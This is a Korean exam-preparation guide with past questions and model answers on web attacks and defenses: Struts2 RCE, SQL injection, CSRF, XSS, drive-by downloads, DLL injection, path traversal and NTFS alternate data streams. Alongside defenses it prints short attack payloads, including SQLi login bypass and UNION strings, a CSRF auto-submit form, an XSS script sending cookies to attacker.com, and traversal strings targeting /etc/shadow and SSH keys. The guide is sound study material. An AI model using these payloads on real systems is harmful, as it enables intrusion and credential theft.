# 웹 공격 상세 - Injection, CSRF, XSS

## 🔴 Struts2 취약점 ★★★

### 문제 (2024년 기출)
```
Struts2 CVE-2016-3081 취약점은?
```

### ✅ 정답
```
Apache Struts2 원격 코드 실행 취약점

CVE-2016-3081 ★★★

취약점:
- REST 플러그인 취약점
- Dynamic Method Invocation (DMI) 악용
- OGNL (Object-Graph Navigation Language) 인젝션

영향:
- 원격 코드 실행 (RCE) ★★★
- 서버 장악 가능

공격 예시:
GET /struts2-rest-showcase/orders/3/
Content-Type: application/xml
!#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
#cmd='calc',#iswin=(@java.lang.System@getProperty('os.name')...

방어:
1. Struts 2.3.29 이상 업데이트 ★★★
2. REST 플러그인 비활성화
3. WAF 적용
4. 입력 검증

주요 Struts2 취약점 역사:
┌──────────────┬────────┬──────────────┐
│     CVE      │  연도  │     내용     │
├──────────────┼────────┼──────────────┤
│ CVE-2017-5638│  2017  │ Jakarta 파일 │
│              │        │ 업로드 RCE ★ │
├──────────────┼────────┼──────────────┤
│ CVE-2016-3081│  2016  │ REST RCE ★★ │
├──────────────┼────────┼──────────────┤
│ CVE-2013-2251│  2013  │ OGNL RCE     │
└──────────────┴────────┴──────────────┘

주요 사고:
- 2017년 Equifax 해킹 (CVE-2017-5638)
  → 1억 4천만 명 개인정보 유출 ★★★
```

---

## 🔴 SQL Injection 상세 ★★★

### 문제 (2024년 기출)
```
SQL Injection의 공격 유형과 방어 방법은?
```

### ✅ 정답
```
SQL Injection = SQL 쿼리 조작 공격

공격 유형:

1. Error-based SQLi ★★
   에러 메시지를 통해 DB 정보 획득

   예시:
   ' OR 1=1--
   ' UNION SELECT NULL,NULL--

   결과:
   SQL 에러 메시지 노출
   → DB 버전, 테이블 구조 파악

2. Union-based SQLi ★★★
   UNION을 이용한 데이터 추출

   예시:
   ' UNION SELECT username, password FROM users--

   결과:
   다른 테이블 데이터 조회

3. Blind SQLi ★★
   참/거짓 응답으로 데이터 추출

   Boolean-based:
   ' AND 1=1--  (참)
   ' AND 1=2--  (거짓)

   Time-based:
   ' AND SLEEP(5)--
   응답 시간으로 판단

4. Second Order SQLi
   저장된 데이터가 나중에 실행

5. Out-of-Band SQLi
   DNS, HTTP 등 다른 채널로 데이터 유출

공격 순서:
1. 입력 필드 탐색
2. ' 입력하여 에러 확인
3. 주석 처리 (--, #, /*)
4. UNION SELECT로 컬럼 개수 파악
5. 테이블/컬럼 이름 추출
6. 데이터 탈취

예시 (로그인 우회):
취약한 코드:
SELECT * FROM users WHERE id='$id' AND pw='$pw'

공격 입력:
id: admin'--
pw: (아무거나)

실행 쿼리:
SELECT * FROM users WHERE id='admin'--' AND pw='...'
                                  ↑
                              주석 처리됨 ★★★

방어 방법: ★★★

1. Prepared Statement (가장 중요!) ★★★
   String sql = "SELECT * FROM users WHERE id=? AND pw=?";
   PreparedStatement pstmt = conn.prepareStatement(sql);
   pstmt.setString(1, id);
   pstmt.setString(2, pw);

2. 입력 검증
   - 특수문자 필터링 (', ", --, ;)
   - 화이트리스트 방식

3. 최소 권한 원칙
   - DB 계정 권한 최소화
   - SELECT만 필요한 경우 SELECT만 부여

4. 에러 메시지 숨김
   - 상세 에러 비노출
   - 일반적인 메시지 출력

5. WAF (Web Application Firewall)
   - ModSecurity
   - 패턴 기반 차단

6. ORM 사용
   - Hibernate, JPA
   - (단, 쿼리 직접 작성 시 여전히 취약)

탐지:
- SQLMap (자동화 도구) ★★★
- Burp Suite
- OWASP ZAP
```

---

## 🔴 CSRF (Cross-Site Request Forgery) ★★★

### 문제 (2024년 기출)
```
CSRF 공격 원리와 방어 방법을 상세히 설명하시오.
```

### ✅ 정답
```
CSRF (Cross-Site Request Forgery)
= 사이트 간 요청 위조

원리: ★★★

사용자가 인증된 상태에서
공격자가 만든 악의적인 요청을 실행하도록 유도

공격 시나리오:

1. 사용자가 은행 사이트 로그인
   → 세션 쿠키 저장 (인증 상태)

2. 공격자가 이메일/게시판에 악성 링크 삽입
   <img src="http://bank.com/transfer?to=attacker&amount=1000000">

3. 사용자가 링크 클릭 (또는 자동 로드)
   → 브라우저가 자동으로 세션 쿠키 전송 ★★★

4. 은행 서버가 정상 요청으로 인식
   → 송금 실행!

예시 공격 코드:

<!-- GET 방식 -->
<img src="http://bank.com/transfer?to=attacker&amount=1000000">

<!-- POST 방식 -->
<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>
  document.forms[0].submit();
</script>

핵심 원리:
브라우저는 도메인에 해당하는 쿠키를 자동으로 전송 ★★★
→ 공격자는 쿠키 값을 몰라도 공격 가능!

vs XSS:
┌──────────┬──────────────┬──────────────┐
│   구분   │     XSS      │    CSRF      │
├──────────┼──────────────┼──────────────┤
│ 공격대상 │ 사용자 ★    │ 서버 ★★    │
├──────────┼──────────────┼──────────────┤
│ 목적     │ 쿠키 탈취   │ 요청 위조   │
├──────────┼──────────────┼──────────────┤
│ 스크립트 │ 필수         │ 불필요       │
├──────────┼──────────────┼──────────────┤
│ SOP 우회 │ 동일 출처만  │ 다른 출처도 │
└──────────┴──────────────┴──────────────┘

방어 방법: ★★★

1. CSRF Token (가장 효과적!) ★★★
   - 서버가 랜덤 토큰 생성
   - 폼에 hidden 필드로 포함
   - 요청 시 토큰 검증

   예시:
   <form action="/transfer" method="POST">
     <input type="hidden" name="csrf_token" value="a8f3k2jd9s">
     <input name="to" value="...">
     <input name="amount" value="...">
   </form>

   서버 검증:
   if (request.csrf_token != session.csrf_token) {
     return "Invalid token";
   }

2. SameSite Cookie ★★★
   Set-Cookie: session=abc; SameSite=Strict

   - Strict: 다른 사이트에서 쿠키 전송 안 함 ★★★
   - Lax: GET은 허용, POST는 차단
   - None: 모두 허용 (기본값, 취약!)

3. Referer 검증
   - HTTP Referer 헤더 확인
   - 같은 도메인만 허용

   단점:
   - Referer는 조작 가능
   - 일부 브라우저/프록시에서 생략

4. Double Submit Cookie
   - 쿠키와 파라미터에 동일한 랜덤 값
   - 두 값 일치 여부 확인

5. Custom Header
   - X-Requested-With: XMLHttpRequest
   - AJAX 요청에만 사용

6. 재인증
   - 중요한 작업 시 비밀번호 재확인
   - OTP 인증

실기 답안 작성:
✅ CSRF Token 사용 (서버가 랜덤 토큰 생성 후 검증) ★★★
✅ SameSite Cookie 설정 (Strict 또는 Lax)
✅ 중요 작업 시 재인증
```

---

## 🔴 XSS 쿠키/세션 공격 ★★★

### 문제 (2024년 기출)
```
XSS를 통한 쿠키 탈취 공격과 방어 방법은?
```

### ✅ 정답
```
XSS (Cross-Site Scripting) 쿠키 탈취

공격 원리:

1. 공격자가 악성 스크립트 삽입
   <script>
     var cookie = document.cookie;
     location.href = 'http://attacker.com/steal?c=' + cookie;
   </script>

2. 피해자가 해당 페이지 접속

3. 브라우저가 스크립트 실행
   → 쿠키를 공격자 서버로 전송 ★★★

4. 공격자가 쿠키로 세션 하이재킹
   → 피해자로 위장 로그인!

XSS 유형:

1. Stored XSS (저장형) ★★★
   - DB에 악성 스크립트 저장
   - 게시판, 댓글에 삽입
   - 모든 사용자에게 영향

2. Reflected XSS (반사형) ★★
   - URL 파라미터에 스크립트 포함
   - 링크 클릭 시 실행
   - 특정 사용자 타겟팅

   예시:
   http://site.com/search?q=<script>alert(document.cookie)</script>

3. DOM-based XSS
   - 클라이언트 측 스크립트에서 발생
   - 서버 로그에 남지 않음

쿠키 속성:

1. HttpOnly ★★★
   Set-Cookie: session=abc; HttpOnly

   - JavaScript에서 document.cookie 접근 차단 ★★★
   - XSS로 쿠키 탈취 불가
   - 가장 효과적인 방어!

2. Secure
   Set-Cookie: session=abc; Secure

   - HTTPS에서만 전송
   - 중간자 공격 방어

3. SameSite
   Set-Cookie: session=abc; SameSite=Strict

   - CSRF 방어

권장 설정:
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict ★★★

방어 방법:

1. 입력 검증 및 필터링 ★★★
   - <, >, ", ', & 등 특수문자 필터링
   - HTML 엔티티 인코딩
     < → &lt;
     > → &gt;

2. 출력 인코딩 ★★★
   - 사용자 입력을 화면에 출력 시 인코딩
   - 템플릿 엔진 사용 (자동 인코딩)

3. CSP (Content Security Policy) ★★
   Content-Security-Policy: script-src 'self'

   - 인라인 스크립트 차단
   - 외부 스크립트 출처 제한

4. HttpOnly 쿠키 ★★★
   - 반드시 설정!

5. WAF 사용
   - ModSecurity
   - 패턴 기반 차단

예시 (안전한 코드):

위험:
<%
  String name = request.getParameter("name");
  out.println("Hello " + name);  // XSS 취약!
%>

안전:
<%
  String name = request.getParameter("name");
  String safeName = StringEscapeUtils.escapeHtml4(name);
  out.println("Hello " + safeName);  // 안전 ★
%>
```

---

## 🔴 Drive-by Download ★★

### 문제 (2024년 기출)
```
Drive-by Download 공격이란?
```

### ✅ 정답
```
Drive-by Download
= 웹사이트 방문만으로 자동 악성코드 다운로드

공격 원리: ★★★

1. 공격자가 정상 웹사이트 해킹
   또는 악성 광고 삽입

2. 사용자가 웹사이트 방문

3. 사용자 동의 없이 악성코드 다운로드/실행
   - 브라우저 취약점 악용 ★★
   - 플러그인 취약점 악용 (Flash, Java)

4. 시스템 감염

공격 벡터:

1. Exploit Kit ★★★
   - Angler EK
   - RIG EK
   - Magnitude EK

   동작:
   - 브라우저/플러그인 버전 탐지
   - 해당 취약점 익스플로잇 실행
   - 악성코드 다운로드

2. 악성 광고 (Malvertising)
   - 정상 광고 네트워크에 악성 광고 삽입
   - 클릭 없이도 감염 가능

3. 워터링 홀 (Watering Hole)
   - 타겟이 자주 방문하는 사이트 감염

특징:
- 사용자 인지 불가 ★★★
- 클릭 불필요
- 취약점 악용 (0-day 포함)

방어:

1. 브라우저/플러그인 최신 업데이트 ★★★
   - Chrome, Firefox 자동 업데이트
   - Flash, Java 업데이트/제거

2. 플러그인 비활성화
   - Flash 제거 (HTML5 사용) ★★
   - Java Applet 비활성화

3. 스크립트 차단
   - NoScript (Firefox)
   - uBlock Origin

4. 백신/EDR
   - 실시간 감시
   - 행위 기반 탐지

5. 네트워크 보안
   - IPS/IDS
   - 웹 프록시 필터링
```

---

## 🔴 Code Injection vs DLL Injection ★★

### 문제 (2024년 기출)
```
Code Injection과 DLL Injection의 차이는?
```

### ✅ 정답
```
1. Code Injection ★★

정의:
다른 프로세스의 메모리에 코드를 직접 주입

방법:
1. VirtualAllocEx() : 타겟 프로세스에 메모리 할당
2. WriteProcessMemory() : 쉘코드 작성
3. CreateRemoteThread() : 원격 스레드 생성 → 실행

장점:
- 파일 없이 메모리만 사용 (파일리스)
- 탐지 어려움

단점:
- 안티바이러스 탐지 가능

2. DLL Injection ★★★

정의:
다른 프로세스에 DLL을 로드하여 실행

방법 1: CreateRemoteThread + LoadLibrary
1. OpenProcess() : 타겟 프로세스 열기
2. VirtualAllocEx() : 메모리 할당
3. WriteProcessMemory() : DLL 경로 쓰기
4. CreateRemoteThread(LoadLibrary) : DLL 로드 ★★★

방법 2: SetWindowsHookEx
- 윈도우 훅 설정
- 특정 이벤트 발생 시 DLL 로드

방법 3: AppInit_DLLs (레지스트리)
- HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows
- user32.dll 로드 시 자동 로드

방법 4: Reflective DLL Injection
- 디스크 없이 메모리에서 DLL 로드
- 탐지 더 어려움

장점:
- 기존 DLL 기능 활용
- 은닉 용이

단점:
- DLL 파일 필요 (Reflective는 제외)

비교:
┌────────────┬──────────────┬──────────────┐
│   구분     │Code Injection│DLL Injection │
├────────────┼──────────────┼──────────────┤
│ 주입 대상  │ 코드(셸코드) │ DLL 파일     │
├────────────┼──────────────┼──────────────┤
│ 파일 필요  │ 불필요 ★    │ 필요 (일반적)│
├────────────┼──────────────┼──────────────┤
│ 탐지       │ 어려움       │ 보통         │
├────────────┼──────────────┼──────────────┤
│ 복잡도     │ 높음         │ 낮음         │
├────────────┼──────────────┼──────────────┤
│ 용도       │ 악성코드     │ 악성코드,    │
│            │              │ 후킹, 디버깅 │
└────────────┴──────────────┴──────────────┘

공통 API:
- OpenProcess() ★★
- VirtualAllocEx() ★★★
- WriteProcessMemory() ★★★
- CreateRemoteThread() ★★★

방어:
- DEP (Data Execution Prevention)
- ASLR (Address Space Layout Randomization)
- 프로세스 무결성 모니터링
- EDR 솔루션
```

---

## 🔴 Directory Traversal ★★

### 문제 (2024년 기출)
```
Directory Traversal 공격 예시와 방어는?
```

### ✅ 정답
```
Directory Traversal (Path Traversal)
= 디렉토리 경로 조작 공격

공격 원리:

사용자 입력으로 파일 경로 조작하여
허가되지 않은 파일 접근

공격 예시:

정상 요청:
http://site.com/download?file=report.pdf

공격 요청 1: ../ 사용
http://site.com/download?file=../../../etc/passwd

공격 요청 2: 인코딩 우회
file=..%2f..%2f..%2fetc%2fpasswd
      (../ URL 인코딩)

공격 요청 3: 더블 인코딩
file=..%252f..%252f..%252fetc%252fpasswd
      (% → %25)

공격 요청 4: Unicode
file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

공격 요청 5: Null Byte
file=../../../etc/passwd%00.pdf
                           ↑
                      Null byte로 확장자 우회

리눅스 주요 타겟:
- /etc/passwd ★★★
- /etc/shadow
- /var/log/apache2/access.log
- ~/.ssh/id_rsa

윈도우 주요 타겟:
- C:\Windows\System32\config\SAM
- C:\boot.ini
- C:\Windows\win.ini

취약한 코드:
String filename = request.getParameter("file");
FileInputStream fis = new FileInputStream("/var/www/files/" + filename);
                                                              ↑
                                                        ../../../etc/passwd

방어 방법: ★★★

1. 입력 검증 (화이트리스트) ★★★
   - 허용된 파일명만 사용
   - 파일명 목록 미리 정의

   String[] allowedFiles = {"report.pdf", "data.xlsx"};
   if (!Arrays.asList(allowedFiles).contains(filename)) {
     return "Invalid file";
   }

2. 경로 정규화 (Canonicalization)
   File file = new File(baseDir, filename);
   String canonicalPath = file.getCanonicalPath();
   if (!canonicalPath.startsWith(baseDir)) {
     return "Access denied"; // ../ 탐지 ★★★
   }

3. ../ 필터링
   - 블랙리스트 (권장 안 함)
   - 인코딩 변형 모두 차단

4. 경로 구분자 제거
   filename = filename.replaceAll("[./\\\\]", "");

5. chroot 환경
   - 접근 가능한 디렉토리 제한

6. 최소 권한
   - 웹 서버 계정 권한 최소화
```

---

## 🔴 ADS (Alternative Data Stream) ★★

### 문제 (2024년 기출)
```
Windows ADS란?
```

### ✅ 정답
```
ADS (Alternative Data Stream)
= NTFS 파일 시스템의 대체 데이터 스트림

정의:
파일 내부에 숨겨진 추가 데이터 저장 공간

특징:
- NTFS에서만 지원 (FAT32는 불가능)
- 파일 크기에 포함 안 됨 ★★★
- 일반 탐색기에서 보이지 않음 ★★★

사용법:

생성:
echo "hidden data" > normal.txt:hidden.txt
                              ↑
                           콜론(:)으로 구분

읽기:
notepad normal.txt:hidden.txt
type normal.txt:hidden.txt

확인:
dir /r        ← ADS 표시 ★★

출력 예시:
normal.txt
normal.txt:hidden.txt:$DATA

악용 사례: ★★★

1. 악성코드 은닉
   calc.exe > innocent.txt:malware.exe

   실행:
   start innocent.txt:malware.exe
   → 파일 크기 변화 없이 악성코드 실행!

2. 데이터 유출
   - 민감 정보를 ADS에 숨겨 유출

3. 타임스탬프 조작 회피
   - 파일 수정 시간 변경 없이 데이터 추가

탐지:

1. dir /r ★★
   C:\> dir /r

   출력:
   normal.txt          (100 bytes)
   normal.txt:ads.txt  (500 bytes)

2. Streams (Sysinternals) ★★★
   streams -s C:\path\*

3. PowerShell
   Get-Item -Path normal.txt -Stream *

4. 포렌식 도구
   - FTK, EnCase
   - Autopsy

방어:

1. ADS 스캔
   - 주기적 검사

2. 파일 이동
   - NTFS → FAT32 → NTFS
   - ADS 삭제됨

3. 레지스트리 설정
   - NtfsDisableLastAccessUpdate

4. 모니터링
   - SIEM 로그 분석
```

---

## 🎯 웹 보안 핵심 암기 카드

### 카드 1: Struts2
```
CVE-2017-5638 (Equifax 사고) ★★★
원격 코드 실행 (RCE)
패치 필수!
```

### 카드 2: SQL Injection
```
Prepared Statement 사용 ★★★
입력 검증, 최소 권한
SQLMap 탐지 도구
```

### 카드 3: CSRF
```
CSRF Token 검증 ★★★
SameSite Cookie (Strict)
Referer 검증
```

### 카드 4: XSS 쿠키 탈취
```
HttpOnly 쿠키 설정 ★★★
입력/출력 인코딩
CSP 적용
```

### 카드 5: Drive-by Download
```
방문만으로 감염
Exploit Kit 사용 ★★★
브라우저 업데이트 필수
```

### 카드 6: Directory Traversal
```
../ 경로 조작
/etc/passwd 접근 ★★
경로 정규화로 방어
```

### 카드 7: ADS
```
NTFS 숨겨진 스트림
dir /r 확인 ★★
파일 크기에 미포함
```

---

## 💡 실기 답안 작성 팁

### Tip 1: SQL Injection 방어
```
✅ Prepared Statement 사용 (가장 중요!) ★★★
✅ 입력 검증, 최소 권한, 에러 메시지 숨김

❌ 특수문자 필터링만 (우회 가능)
```

### Tip 2: CSRF vs XSS
```
✅ CSRF: 요청 위조, 서버 공격, CSRF Token
✅ XSS: 스크립트 실행, 클라이언트 공격, 쿠키 탈취

❌ 둘 다 쿠키 탈취 (CSRF는 쿠키 탈취 안 함!)
```

### Tip 3: HttpOnly 쿠키
```
✅ JavaScript document.cookie 접근 차단 ★★★
✅ XSS 쿠키 탈취 방어

❌ HTTPS에서만 전송 (그건 Secure 속성)
```

### Tip 4: ADS 탐지
```
✅ dir /r 명령어 ★★
✅ Streams 도구 (Sysinternals)

❌ dir /a (숨김 파일 보기, ADS 아님)
```

---

## 🔥 실기 시험 최빈출 웹 공격 개념

```
1위: SQL Injection (Prepared Statement) ← 2024년 출제! ★★★
2위: CSRF (Token, SameSite)             ← 2024년 출제! ★★★
3위: XSS (HttpOnly 쿠키)                ← 2024년 출제! ★★★
4위: Directory Traversal (../)          ← 2024년 출제!
5위: ADS (dir /r)                       ← 2024년 출제!
6위: Struts2 (CVE-2017-5638)            ← 2024년 출제!
7위: Drive-by Download                  ← 2024년 출제!
8위: DLL Injection                      ← 2024년 출제!
```

**✅ SQL Injection 방어는 Prepared Statement가 핵심!**
**✅ CSRF Token과 SameSite Cookie는 필수 조합!**
**✅ HttpOnly 쿠키는 XSS 쿠키 탈취 방어의 최우선!**
